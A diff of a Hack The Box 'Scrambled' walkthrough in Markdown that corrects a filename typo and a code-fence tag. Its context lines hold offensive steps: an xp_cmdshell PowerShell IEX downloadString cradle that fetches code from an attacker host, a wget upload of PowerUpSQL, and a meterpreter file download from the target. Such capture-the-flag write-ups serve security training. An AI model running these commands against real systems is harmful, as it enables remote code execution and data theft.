@@ -258,7 +258,7 @@ xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://<IP
 The sqlsvc hasn't got a user.txt flag, so we have to enumerate other user. We can dump the MSSQL datavase with [PowerUpSQL.ps1](https://github.com/NetSPI/PowerUpSQL) script. We can upload it on the machine with PowerShell's `wget`, it is an alias for `Invoke-WebRequest` command. We have to specify the address and the output file here.
 
 ```powershell
-wget -Uri "http://<IP>:<PORT>/PowerUpSQL.ps1" -OutFile PowerUPSQL.ps1
+wget -Uri "http://<IP>:<PORT>/PowerUpSQL.ps1" -OutFile PowerUpSQL.ps1
 ```
 It is a very powerful tool, you can use the [cheatsheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet) to get some useful commands.
 
@@ -325,7 +325,7 @@ Then, in the `Shares` directory we can find a `ScrambleClient` executable. We ha
 
 ![ScrambleClient](/assets/hackthebox/scrambled/scramblecorpclient.png)
 
-```meterpreter
+```bash
 cd "C:\Shares\IT\Apps\Sales Order Client"
 download *
 ```
